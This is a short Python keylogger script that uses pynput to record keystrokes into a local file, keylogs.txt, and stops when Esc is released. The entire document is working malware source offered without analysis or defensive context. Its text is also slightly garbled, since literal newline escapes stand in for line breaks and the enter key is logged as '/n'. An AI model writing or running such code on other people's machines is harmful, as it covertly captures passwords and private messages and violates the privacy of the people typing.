import pynput\nfrom pynput import keyboard\n\ndef on_key_press(key):
    try:
        with open("keylogs.txt", "a+") as file:
            if hasattr(key, 'char'):
                file.write(key.char)
            elif key == keyboard.Key.space:
                file.write(' [SPACE] ')
            elif key == keyboard.Key.enter:
                file.write(' [ENTER]/n')
    except Exception as e:
        print("Error: ", str(e))\n\ndef on_release(key):
    if key == keyboard.Key.esc:
        return False # Stop listener on release of esc\n\nwith keyboard.Listener(on_press=on_key_press, on_release=on_release) as listener:
    listener.join()
